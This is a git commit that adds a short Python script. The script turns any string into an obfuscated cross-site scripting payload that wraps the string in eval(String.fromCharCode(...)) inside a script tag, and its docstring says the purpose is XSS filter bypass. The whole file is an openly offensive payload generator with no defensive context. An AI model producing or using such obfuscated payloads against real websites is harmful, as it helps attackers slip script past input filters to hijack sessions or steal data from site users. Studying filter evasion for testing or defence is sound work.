1caee2b60610a027994df9df3826dab98170c7ef
Timothy Gribble <timothy@Timothys-MBP.lan>
2020-01-05 11:25:16 +1000

    committ

---
+++ xss_string_to_ascii.py
@@ -0,0 +1,20 @@
+#!/usr/bin/python3
+
+import sys
+
+"""script to take a string as its only argument and convert it
+into ascii for quick xss filter bypass"""
+
+def stringToAscii(stringToConvert):
+    encodeString = stringToConvert.encode()
+    convertedString = list(bytes(encodeString))
+    catString = ""
+    for i in convertedString:
+        catString = catString + "" + str(i) + ","
+    print("<script>eval(String.fromCharCode(" + catString + "))</script>")
+
+if len(sys.argv) != 2:
+    print("Example usage: python3 xss_string_to_ascii.py string_value\nEnsure you use quotes or escape special characters")
+    sys.exit
+else:
+    stringToAscii(sys.argv[1])
